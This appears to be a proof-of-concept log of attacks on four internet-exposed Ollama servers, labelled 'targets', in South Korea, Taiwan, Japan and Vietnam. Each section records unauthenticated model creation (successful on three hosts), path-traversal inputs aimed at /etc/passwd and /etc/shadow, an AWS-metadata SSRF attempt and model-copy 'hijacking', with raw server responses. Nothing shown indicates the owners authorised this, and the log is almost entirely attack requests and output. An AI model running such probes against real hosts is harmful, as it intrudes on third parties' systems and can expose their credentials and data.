# 🔴 Remaining Targets PoC — Ollama v0.20+

**Date:** 2026-06-07 18:18 UTC

---
## Instance: [REDACTED_IP_5] (v0.20.1, South Korea)

### Version
Response: {"version":"0.20.1"}

### Models
```
```

### /api/create — Unauthenticated Model Creation
```
{"status":"creating new layer sha256:0b125177da1a4eaac3306a7e20f8bb5d807a3d6c91ff30bfa334491b160ac464"}
{"status":"writing manifest"}
{"status":"success"}

```

### /api/push — Path Traversal
```
Linux traversal: {"error":"unqualified name: ../../../etc/passwd:latest"}

Double-encoded traversal: {"error":"unqualified name: registry.ollama.ai/library/..%2f..%2f..%2fetc%2fshadow:latest"}

```

### /api/copy — Model Hijacking
```
Copy test: 

```

### /api/pull — SSRF
```
AWS metadata SSRF: {"error":"invalid model name"}

```

### Cleanup
```
Delete poc_cve_2026_test: 
Delete poc_copy_test: 
```

---
## Instance: [REDACTED_IP_6] (v0.20.2, Taiwan)

### Version
Response: {"version":"0.20.2"}

### Models
```
```

### /api/create — Unauthenticated Model Creation
```
{"status":"creating new layer sha256:0b125177da1a4eaac3306a7e20f8bb5d807a3d6c91ff30bfa334491b160ac464"}
{"status":"writing manifest"}
{"status":"success"}

```

### /api/push — Path Traversal
```
Linux traversal: {"error":"unqualified name: ../../../etc/passwd:latest"}

Double-encoded traversal: {"error":"unqualified name: registry.ollama.ai/library/..%2f..%2f..%2fetc%2fshadow:latest"}

```

### /api/copy — Model Hijacking
```
Copy test: 

```

### /api/pull — SSRF
```
AWS metadata SSRF: {"error":"invalid model name"}

```

### Cleanup
```
Delete poc_cve_2026_test: 
Delete poc_copy_test: 
```

---
## Instance: [REDACTED_IP_7] (v0.20.5, Japan)

### Version
Response: {"version":"0.20.5"}

### Models
```
```

### /api/create — Unauthenticated Model Creation
```
{"status":"creating new layer sha256:0b125177da1a4eaac3306a7e20f8bb5d807a3d6c91ff30bfa334491b160ac464"}
{"status":"writing manifest"}
{"status":"success"}

```

### /api/push — Path Traversal
```
Linux traversal: {"error":"unqualified name: ../../../etc/passwd:latest"}

Double-encoded traversal: 

```

### /api/copy — Model Hijacking
```
Copy test: 

```

### /api/pull — SSRF
```
AWS metadata SSRF: 

```

### Cleanup
```
Delete poc_cve_2026_test: 
Delete poc_copy_test: 
```

---
## Instance: [REDACTED_IP_8] (v0.23.2, Vietnam)

### Version
Response: {"version":"0.23.2"}

### Models
```
```

### /api/create — Unauthenticated Model Creation
```
{"status":"pulling manifest"}
{"error":"pull model manifest: file does not exist"}

```

### /api/push — Path Traversal
```
Linux traversal: {"error":"unqualified name: ../../../etc/passwd:latest"}

Double-encoded traversal: {"error":"unqualified name: registry.ollama.ai/library/..%2f..%2f..%2fetc%2fshadow:latest"}

```

### /api/copy — Model Hijacking
```
Copy test: {"error":"mkdir /usr/share/ollama/.ollama/models/manifests/registry.ollama.ai/library/poc_copy_test: no space left on device"}

```

### /api/pull — SSRF
```
AWS metadata SSRF: {"error":"invalid model name"}

```

### Cleanup
```
Delete poc_cve_2026_test: {"error":"model 'poc_cve_2026_test' not found"}
Delete poc_copy_test: {"error":"model 'poc_copy_test' not found"}
```


**END**
